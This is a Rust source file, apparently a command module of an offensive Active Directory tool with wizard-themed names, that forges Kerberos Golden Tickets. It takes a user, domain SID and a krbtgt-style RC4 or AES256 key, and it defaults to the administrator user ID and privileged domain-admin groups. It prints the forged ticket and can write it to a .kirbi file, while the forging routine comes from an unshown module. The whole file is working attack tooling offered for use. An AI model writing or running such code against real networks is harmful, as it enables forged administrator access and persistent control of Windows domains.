use anyhow::{bail, Result};
use std::collections::HashMap;
use crate::dungeon::dark_arts::{forge_golden, TicketBlueprint};
use crate::dungeon::display_charm::*;
use crate::dungeon::krb_structures::constants::*;
use crate::dungeon::wand_utils;

pub struct ElderWand;

impl super::Spell for ElderWand {
    fn incantation(&self) -> &'static str { "elder-wand" }
    fn grimoire(&self) -> &'static str {
        "Forge a Golden Ticket. /user: /domain: /sid: /rc4: or /aes256: [/groups:] [/id:] [/outfile:]"
    }
    fn cast(&self, args: &HashMap<String, String>) -> Result<()> {
        let user   = args.get("user").ok_or_else(|| anyhow::anyhow!("/user: required"))?;
        let domain = args.get("domain").ok_or_else(|| anyhow::anyhow!("/domain: required"))?;
        let sid    = args.get("sid").ok_or_else(|| anyhow::anyhow!("/sid: required"))?;
        let (key, etype) = crate::spells::accio_tgt::resolve_key(args, user, domain)?;
        let groups = args.get("groups")
            .map(|g| g.split(',').filter_map(|s| s.trim().parse::<u32>().ok()).collect::<Vec<_>>())
            .unwrap_or_else(|| vec![520, 512, 513, 519, 518]);
        let user_id = args.get("id").and_then(|s| s.parse::<u32>().ok()).unwrap_or(500);
        let bp = TicketBlueprint {
            username: user.clone(), domain: domain.clone(), sid: sid.clone(),
            user_id, groups, service_key: key, service_etype: etype,
            ..Default::default()
        };
        print_banner("Forging Golden Ticket");
        let forged = forge_golden(&bp)?;
        print_success("Golden ticket forged");
        println!("{}", forged.b64);
        if let Some(outfile) = args.get("outfile") {
            std::fs::write(outfile, &forged.kirbi)?;
            print_success(&format!("Written to {}", outfile));
        }
        Ok(())
    }
}
